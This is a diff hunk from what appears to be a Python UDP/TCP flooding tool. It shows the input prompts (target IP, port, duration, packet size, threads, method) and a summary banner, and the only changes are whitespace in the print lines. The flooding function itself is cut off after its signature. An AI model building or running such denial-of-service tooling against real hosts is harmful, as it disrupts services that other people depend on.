@@ -33,28 +33,28 @@ print("\033[1;330m════════════════════�
 
 # Prompt user for input
 def get_user_input():
-    print("\033[1;35m +========================================================\033[0m")
+    print("\033[1;35m+========================================================\033[0m")
     target_ip = input("\033[0;37m | Target IP : \033[1;32m").strip()
     target_port = input("\033[0;34m | Target Port : \033[1;33m").strip()
     attack_time = input("\033[0;36m | Time (seconds) : \033[0;33m").strip()
     packet = input("\033[0;33m | Packet : \033[0;36m").strip()
     thread_count = input("\033[1;33m | Thread : \033[0;34m").strip()
     method = input("\033[1;32m | Method (UDP/TCP & UDP Mix) : \033[0;37m").strip().lower()
-    print("\033[1;35m =========================================================\033[0m")
+    print("\033[1;35m=========================================================\033[0m")
 
     return target_ip, int(target_port), int(attack_time), int(packet), int(thread_count), method
 
 # Display input summary after user provides inputs
 def display_input_summary(target_ip, target_port, attack_time, packet, thread_count, method):
     display_header()  # Show the banner again
-    print(" +=======================================================+")
+    print("+=======================================================+")
     print(f" \033[0;37m| Target IP : \033[1;32m{target_ip:<40}  |")
     print(f" \033[0;34m| Target Port : \033[1;33m{target_port:<40}|")
     print(f" \033[0;36m| Time : \033[0;33m{attack_time:<40}       |")
     print(f" \033[0;33m| Packet : \033[0;36m{packet:<45}|")
     print(f" \033[1;33m| Thread : \033[0;34m{thread_count:<45}|")
     print(f" \033[1;32m| Method (UDP/TCP & UDP Mix) : \033[0;37m{method:<25}|")
-    print(" =========================================================")
+    print("=========================================================")
 
 # UDP attack function
 def udp_attack(ip, port, packet, duration, thread_count):
